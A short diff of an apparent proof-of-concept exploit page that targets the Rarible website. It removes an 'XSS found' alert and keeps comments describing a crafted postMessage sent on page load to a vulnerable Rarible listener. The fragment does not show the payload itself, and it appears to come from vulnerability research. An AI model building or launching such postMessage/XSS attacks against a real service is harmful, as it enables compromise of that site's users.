@@ -10,9 +10,6 @@
     <p>This page sends a malicious payload to the target website (Rarible).</p>
 
     <script>
-        // Alert box indicating XSS found
-        alert("XSS found");
-
         // When the malicious page loads, send the crafted postMessage to Rarible
         window.onload = function() {
             // Define the malicious message that will trigger the vulnerable Rarible listener
